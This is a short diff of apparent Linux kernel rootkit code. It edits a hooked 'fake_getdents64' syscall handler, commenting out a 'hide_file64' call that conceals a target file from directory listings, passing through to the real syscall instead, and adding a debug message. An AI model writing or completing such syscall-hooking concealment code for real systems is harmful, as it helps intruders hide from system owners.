@@ -102,8 +102,10 @@ asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *d
 {
     long rv;
     
-    rv = hide_file64(targetfile, dirp, count);
-   
+//    rv = hide_file64(targetfile, dirp, count);
+    rv = kernel_getdents64(fd, dirp, count);
+    printk("Yes, faked the getdent!");
+    
     return rv;
 }
  
